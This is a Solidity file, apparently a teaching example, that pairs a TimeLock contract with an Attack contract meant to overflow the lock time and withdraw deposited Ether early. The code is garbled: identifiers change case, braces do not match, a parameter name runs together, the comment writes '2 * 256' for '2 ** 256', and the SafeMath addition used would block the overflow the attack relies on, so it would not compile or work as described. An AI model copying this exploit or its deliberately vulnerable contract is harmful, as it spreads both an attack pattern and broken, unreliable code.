// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10 ;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";
contract TimeLock {
    using SafeMath for uint;
    mapping ( address => uint ) public balances ;
    mapping ( address => uint ) public lockTime ;
    function deposit( ) external payable {
        balances [msg.sender] = msg.value ;
        LockTime [msg.sender] = now + 1 weeks ;
   }
    function increaseLockTime ( uint secondsToIncrease ) public {
        LockTime[msg.sender] = lockTime [msg.sender].add(secondsToIncrease);
   }
    function withdraw() public {
        require(balances[msg.sender]>0,"Insufficient funds " );
        require ( now > lockTime [ msg.sender ] , " Lock time not expired " ) ;
        uint amount = balances[ msg.sender ] ;
        balances [ msg.sender ] = 0 ; 
        ( bool sent , )= msg.sender.call { value : amount }( " " ) ;
        require (sent, "Failed to send Ether") ; 
        }
    }


contract Attack{
    TimeLock timeLock ;
    constructor ( TimeLock_timeLock ) public {
        timeLock = TimeLock ( _timeLock ) ;
   }
    fallback()external payable { }
    function attack() public payable {
        timeLock.deposit ( value : msg.value } ( ) ;
        // t == current lock time
        // find x such that
        // x + t = 2 * 256 = 0
        // x = -t
        timeLock.increaseLockTime(
            // 2 ** 256 - t
        uint (-timeLock.lockTime(address(this)))
        );
        timeLock.withdraw();
        
    }
